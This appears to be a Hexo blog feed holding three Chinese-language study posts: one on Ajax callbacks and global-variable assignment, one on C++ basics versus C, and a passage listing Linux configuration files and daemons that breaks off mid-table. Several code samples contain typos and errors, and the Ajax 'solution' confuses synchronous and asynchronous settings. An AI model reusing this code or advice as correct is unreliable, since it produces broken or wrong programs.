      <url>/2018/05/09/ajax%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="Abstact"><a href="#Abstact" class="headerlink" title="Abstact"></a>Abstact</h2><p>这些天开始慢慢深入接触到一些web前端的知识，当然不只是前端网站的布局设计上面，主要还是在处理一些逻辑上的问题。也就是实验室现在有了个前端脚本混淆的工程，那么写前端代码自然是必不可少的。特别是在前后端数据交互方面的代码编写。这篇文章主要是记录一下对Ajax的全局变量赋值问题的解决。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="What"><a href="#What" class="headerlink" title="What"></a>What</h3><p><code>ajax</code>是2004年才应用于现在的web前后端数据交互技术，简单的说就是可以在javascript层面实现前后端的交互（虽然这样理解是不确切的，前端js的执行是在浏览器这架构上，所以<code>ajax</code>是一种浏览器和后端服务器交互的技术，只是浏览器的脚本语言为js,所以ajax这中技术就被直观为程序员所理解的浏览器提供的API形式，也就是<code>xmlhttprequest</code>。）它说白了就是一次发包请求（<code>post</code> <code>get</code>）,但是它和以往的请求有点不一样，他可以不请求整个html文件来对页面进行刷新，而是发送一个请求，把请求到的数据按需要内嵌到当前html中。<br><a id="more"></a></p><h3 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h3><p>那么，为什么会有这个技术？技术的产生，当然是因为人类的需求。试想每次请求都去刷新整个页面，务必会使web应用不友好（盲目的等待，不必要的整个页面的加载和刷新），同时会加重网络传输的负担。无论在客户端还是服务端都是持有弊端的。所以<code>ajax</code>技术应运而生。它通过异步的可编程的方式来对页面进行刷新，而这个过程通常对使用者是透明的，也就是说用户一般感受不到这次发包的过程。同时实现了按需请求，可以在后端指定发送内容，避免了一大推的垃圾html代码（毫无变化，但是仍旧需要再次传输）。响应速度也会得到很大的提升。</p><h3 id="How"><a href="#How" class="headerlink" title="How"></a>How</h3><p>比较常用的两种形式：<code>原生javasctript</code>,<code>jequry</code>  </p><ul><li>原生javascript<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建对象</span></span><br><span class="line">xmlhttp = <span class="keyword">new</span> XMLHttpRequest();<span class="comment">//xmlhttp为实例化的XHR对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//更为兼容的方式是定义一个新的函数</span></span><br><span class="line"><span class="keyword">var</span> xmlhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">  &#123;<span class="comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;<span class="comment">// code for IE6, IE5</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="comment">/*==========================================================================================================================</span></span><br><span class="line"><span class="comment"> ============================================================================================================================*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//调用open,send,等方方法来实现发送一个数据包，注意定义一个状态改变函数，否则这个响应无法实现，就类似一个callback函数一样。</span></span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"ajax/form_return.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"data="</span> + data);</span><br><span class="line">xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span> &amp;&amp; xmlhttp.status == <span class="number">200</span>) &#123;</span><br><span class="line">    alert(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p> 更多细节请查阅相关文档</p></blockquote><ul><li>jequry形式<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//和原生js相比，jequry对js代码进行了简化和重构，如下一个.ajax对象，里面封装了属性和方法。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cdata=<span class="number">30</span>;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url : <span class="string">'./ajax/form_return.php'</span>,</span><br><span class="line">    <span class="keyword">async</span> : <span class="literal">true</span>,</span><br><span class="line">    data: &#123;<span class="attr">data</span>:cdata&#125;,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        alert(data.responseText);<span class="comment">//data为实例化XHR对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>更多的细节和字段含义可以查阅相关文档  </p></blockquote><p>这里补充一下XHR返回对象的主要属性，XHR对象就是<code>XMLHttpRequest对象</code>,它返回主要有以下几个属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">responseText: 作为响应主体被返回的文本(文本形式)</span><br><span class="line">responseXML: 如果响应的内容类型是&apos;text/xml&apos;或&apos;application/xml&apos;，这个属性中将保存着响应数据的XML DOM文档(document形式)</span><br><span class="line">status: HTTP状态码(数字形式)</span><br><span class="line">statusText: HTTP状态说明(文本形式)</span><br></pre></td></tr></table></figure></p><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p>现在到了写这篇文章的正真意义所在了。由于ajax是支持异步模式的，考虑一种情况，在支持异步的模式下，如何通过一个状态转移函数给一个全局的变量赋值？</p><p>相信写过ajax异步请求，并且需要如此操作的程序员都会面临这个在其他语言中就是个函数直接对全局变量进行修改的小问题，在这加入了一步的ajax请求有时会变得充满了玄学（其实是笔者初涉ajax,才把之说为玄学，还请正真理解了ajax原理的师傅莫要嘲笑）。  </p><h5 id="问题代码如下："><a href="#问题代码如下：" class="headerlink" title="问题代码如下："></a>问题代码如下：</h5><ul><li>原生javascript</li></ul><p>前端：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> date=<span class="number">30</span>; </span><br><span class="line"><span class="keyword">var</span> result;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"ajax/form_return.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"data="</span> + data);</span><br><span class="line">xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span> &amp;&amp; xmlhttp.status == <span class="number">200</span>) &#123;</span><br><span class="line">    result=xmlhttp.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">alert(result);</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure></p><p>后端：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$Getdata=$_POST[<span class="string">"data"</span>];</span><br><span class="line">$response=<span class="string">"hello world"</span>;</span><br><span class="line"><span class="comment">#$Getdata=30;</span></span><br><span class="line"><span class="keyword">if</span>($Getdata==<span class="number">30</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $response;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>按我们的理解这里明明应该弹出一个消息框，上面为服务端返回的值<code>hello world</code>,然而实际上是<code>undefined</code>,exuse me?</p><ul><li>jequry<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cdata=<span class="number">30</span>;</span><br><span class="line"><span class="keyword">var</span> result;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url : <span class="string">'./ajax/form_return.php'</span>,</span><br><span class="line">    <span class="keyword">async</span> : <span class="literal">true</span>,</span><br><span class="line">    data: &#123;<span class="attr">data</span>:cdata&#125;,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        result=data.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">alert(result);</span><br></pre></td></tr></table></figure></li></ul><p>在这里result同样是<code>undefined</code>，excuse me?</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><p>经过一番苦苦寻觅后，现在总结一下可以尝试对全局变量进行赋值的两种思想。</p><ul><li>使用html5的新特性，利用浏览器Web Storage，将函数中接收到的值保存到浏览器的sessionStorage或localStorage（两者都可以用来保存一些数据，前者只是对当前页面，会话有效，后者保存在本地，可以页面之间共用）</li><li>在jequry中把异步模式设置成<code>true</code>,然后把<code>success</code>方法设置成<code>compete</code>（这个设置同步模式的方法在原生js里面缺少类似complete的方法，所以只对jequry还有效）</li><li>在子线程中设置同步请求模式，因为之前说过主线程的同步设置是被浏览器所不推荐的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 浏览器安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>cpp</title>
      <link href="/2018/03/09/cpp/"/>
      <url>/2018/03/09/cpp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>主要学习在基本语法上面c++ 与c的差别，当然最主要的面向对象部分就不列出，打算将python,php，c++   的面向对象做一个对比。</p></blockquote><h1 id="函数的重载"><a href="#函数的重载" class="headerlink" title="函数的重载"></a>函数的重载</h1><p>将函数返回类型相同，函数功能相同的，但是参数的数据类型以及容忍参数个数不同的函数命名为相同的函数名的现象，就叫做函数重载。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1,<span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (num1&gt;=num2)?num1:num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">float</span> num1,<span class="keyword">float</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (num1&gt;=num2)?num1:num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1,<span class="keyword">int</span> num2,<span class="keyword">int</span> num3)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (max(num1,num2)&gt;num3)?max(num1,max2):num3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>为了实现更为高级的代码重用，c++里面还提供了函数模板的功能。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#格式：</span><br><span class="line"><span class="keyword">template</span>&lt;&lt;<span class="class"><span class="keyword">class</span>&gt;/&lt;typename&gt; <span class="title">T1</span>(<span class="title">T2</span>，<span class="title">T3</span>,......)&gt;</span></span><br><span class="line"><span class="class"><span class="title">T1</span> <span class="title">max</span>(<span class="title">T1</span> <span class="title">nunm1</span>,<span class="title">T1</span> <span class="title">num2</span>)&#123;</span></span><br><span class="line">    T1 themax;</span><br><span class="line">    themax=(num1&gt;=num2)?num1:num2;</span><br><span class="line">    <span class="keyword">return</span> themax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h1><p>命名空间是为了避免在不同的文件应用过程中出现函数，对象，变量命名重复的情况，所以指定了命名空间。相同命名空间不能出现重名，不同的命名空间可以。命名空间的两种形式以及命名空间类的指定方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命名空间::成员名称</span><br><span class="line">在这中命名形式下的的对象以及常量的引用需要有&quot;::&quot;</span><br><span class="line"></span><br><span class="line">using namespace &lt;命名空间&gt;</span><br><span class="line">这种引用形式下可以直接对类和常量实现引用</span><br></pre></td></tr></table></figure></p><h1 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h1><p>内联函数是为了让功能相对简单的函数避免调用栈以及相关的操作来加速程序，提高运行效率的做法。特别注意的是：这里的内联函数需要函数相对简单，也就是直观的来看就是代码行数小。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inline 返回的值类型 函数名(形参列表)&#123;</span><br><span class="line">    函数体;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="new-delete实现动态创建数组"><a href="#new-delete实现动态创建数组" class="headerlink" title="new,delete实现动态创建数组"></a>new,delete实现动态创建数组</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void main()&#123;</span><br><span class="line">    int length,i,*ptr1;</span><br><span class="line">    cout &lt;&lt;&quot;请输入数组的长度&quot;;</span><br><span class="line">    cin &gt;&gt; lenth;</span><br><span class="line">    ptr1=new int[length];//这是c++特有的，C语言里面是会报错的</span><br><span class="line">    delete[] ptr1;//注意变量结束记得销毁，不然会导致内存无法再次使用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://blog.csdn.net/u013630349/article/details/44947255" target="_blank" rel="noopener">malloc free 与new  delete的比较</a></p><h1 id="枚举数据类型"><a href="#枚举数据类型" class="headerlink" title="枚举数据类型"></a>枚举数据类型</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enum 枚举数据类型名 &#123;变量值列表标识符&#125;#其值一次对应的是0，1，2，3......</span><br><span class="line"></span><br><span class="line">枚举变量类型名 标识符</span><br></pre></td></tr></table></figure><h1 id="C-引入的4种强制类型转换符"><a href="#C-引入的4种强制类型转换符" class="headerlink" title="C++引入的4种强制类型转换符"></a>C++引入的4种强制类型转换符</h1><p>1.static_cast<br>2.const_cast<br>3.dynamic_cast<br>4.reinterpret_cast</p><h1 id="输入输出函数"><a href="#输入输出函数" class="headerlink" title="输入输出函数"></a>输入输出函数</h1><p>在C++中的函数输入输出和之前的C有了很大的不同，它采用的是一种很明显的数据流操作方式，就好比linux中流的重定向&lt;&lt;,&gt;&gt;。相对应的函数为cout,cin,同时也没有了c中的强制类型声明，相对比较灵活。</p>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux修炼</title>
      <link href="/2018/03/07/linux%E4%BF%AE%E7%82%BC/"/>
      <url>/2018/03/07/linux%E4%BF%AE%E7%82%BC/</url>
      
        <content type="html"><![CDATA[<h1 id="网络配置文件"><a href="#网络配置文件" class="headerlink" title="网络配置文件"></a>网络配置文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#ip ,netmast,dhcp,gateway</span><br><span class="line"></span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-&lt;interface-name&gt;</span><br><span class="line"></span><br><span class="line">#ifup,ifdown系列自动启动/关闭网络接口脚本</span><br><span class="line">/etc/syysconfig/network-scripts/ifdown-xxx or ifup-xxx</span><br><span class="line"></span><br><span class="line">#主机网络基本配置</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line"></span><br><span class="line">#DNS IP</span><br><span class="line">/etc/resolv.conf</span><br><span class="line"></span><br><span class="line">#私有ip对应的主机名,实现本机静态查询</span><br><span class="line">/etc/hosts</span><br><span class="line"></span><br><span class="line">#针对ubuntu的独有的网络配置文件</span><br><span class="line">/etc/network/interfaces</span><br><span class="line"></span><br><span class="line">#用于重新启动服务的目录</span><br><span class="line">/etc/init.d/network </span><br><span class="line">#或者使用内置脚本</span><br><span class="line">ifup &lt;interface&gt; </span><br><span class="line">ifdown &lt;interface&gt;</span><br><span class="line"></span><br><span class="line">#几个固定协议文件，一般不需要修改</span><br><span class="line">#网络协议定义文件，包括默认端口的信息</span><br><span class="line">/etc/services</span><br><span class="line">#网络数据包默认协议</span><br><span class="line">/etc/protocols</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="进程配置文件"><a href="#进程配置文件" class="headerlink" title="进程配置文件"></a>进程配置文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#服务启动脚本</span><br><span class="line">/etc/init.d/&lt;deamon&gt;</span><br><span class="line"></span><br><span class="line">#服务初始化配置</span><br><span class="line">/etc/sysconfig/*</span><br><span class="line"></span><br><span class="line">#superdeamon 配置文件</span><br><span class="line">/etc/xinetd.config #大体配置</span><br><span class="line">/etc/xinetd.d/*    #具体到superdeamon 管辖下的每个服务的具体配置</span><br><span class="line"></span><br><span class="line">#服务本身的配置文件</span><br><span class="line">/etc/&lt;deamon&gt;</span><br><span class="line"></span><br><span class="line">#服务数据存放</span><br><span class="line">/var/lib/*</span><br><span class="line"></span><br><span class="line">#服务的pid记录处</span><br><span class="line">/var/run/*</span><br></pre></td></tr></table></figure><p><strong>linux重要守护进程</strong></p><table> <tbody>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> acpi-support</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 高级电源管理支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> acpid</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> acpi 守护程序.这两个用于电源管理，非常重要</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> apmd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> acpi 的扩展</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> alsa</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 声音子系统</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> alsa-utils</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 声音子系统实用工具</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> cron</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 任务调度系统，建议开启</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> anacron</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> cron 的子系统，将系统关闭期间的计划任务，在下一次系统运行时执行</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> atd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 类似于 cron 的任务调度系统。建议关闭</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> binfmt-support</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 核心支持其他二进制的文件格式</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> bluez-utiles</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 蓝牙设备支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> bootlogd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 启动日志。开启它</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> syslog-ng</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 系统日志，建议开启</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> klogd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 同上，使用一种就可以了</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> cupsys</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 打印机子系统</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> dbus</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 消息总线系统(message bus system)。非常重要</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> dns-clean</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 使用拨号连接时，清除 dns信息</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> evms</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 企业卷管理系统</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> fetchmail</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 邮件用户代理守护进程，用于收取邮件</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> gdm</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> gnome 登录管理器</td>   </tr>   <tr>    